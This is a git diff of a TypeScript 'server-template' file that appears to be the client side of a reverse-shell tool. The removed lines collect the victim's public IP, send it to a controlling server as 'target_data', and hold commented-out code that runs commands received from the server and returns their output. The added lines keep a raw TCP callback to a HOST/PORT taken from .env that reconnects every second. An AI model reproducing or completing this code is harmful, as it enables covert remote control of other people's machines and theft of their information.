@@ -1,44 +1,35 @@
-import path from 'node:path'
 import { config } from 'dotenv'
-import { SocketReverseServer } from './event/SocketReverseServer'
-const { publicIpv4 } = require('fix-esm').require('public-ip')
+import { connect, type Socket } from 'node:net'
+import path from 'node:path'
 
-async function handle (): Promise<void> {
-  config({
-    path: path.resolve('src', 'server-template', '.env')
+config({
+  path: path.resolve('src', 'server-template', '.env')
+})
+
+let socket: Socket
+
+function connectSocket (): void {
+  socket = connect({
+    host: process.env.HOST,
+    port: Number(process.env.PORT)
   })
 
-  const targetData = {
-    ip: await publicIpv4()
-  }
+  socket.on('error', (err) => {
+    console.clear()
+    console.error(`Error in connection: ${err.message}`)
+    setTimeout(connectSocket, 1000)
+  })
 
-  SocketReverseServer.on('connect', () => {
+  socket.on('close', () => {
+    console.clear()
+    console.log('Socket closed')
+    setTimeout(connectSocket, 1000)
+  })
+
+  socket.on('connect', () => {
+    console.clear()
     console.log('Server connected!')
-    SocketReverseServer.emit('target_data', targetData)
   })
-
-  // socket.on('connect', async () => {
-  //   socket.on('command', (command: string) => {
-  //     console.log('Receiving command: ', command)
-
-  //     exec(command, (error: Error, stdout, stderr) => {
-  //       if (error) {
-  //         socket.emit('result', error.message)
-  //         return
-  //       }
-
-  //       if (stderr) {
-  //         socket.emit('result', stderr)
-  //         return
-  //       }
-
-  //       console.log('Sending result: ', stdout)
-  //       socket.emit('result', stdout)
-  //     })
-  //   })
-  // })
 }
 
-handle().catch((error) => {
-  console.error(error)
-})
+connectSocket()
